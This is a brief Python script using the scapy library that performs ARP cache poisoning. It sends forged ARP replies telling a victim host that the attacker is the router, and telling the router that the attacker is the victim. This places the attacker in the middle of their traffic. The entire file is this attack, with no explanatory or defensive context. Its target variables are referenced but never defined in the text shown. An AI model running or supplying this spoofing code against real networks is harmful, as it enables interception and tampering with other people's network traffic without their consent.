#!/usr/bin/env python
import scapy.all as scapy

def arpsend(target_ip, target_addr, src_ip):
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=src_ip)
    scapy.send(arp_packet)

arpsend(victim_ip, victim_addr, router_ip)
arpsend(router_ip, router_addr, victim_ip)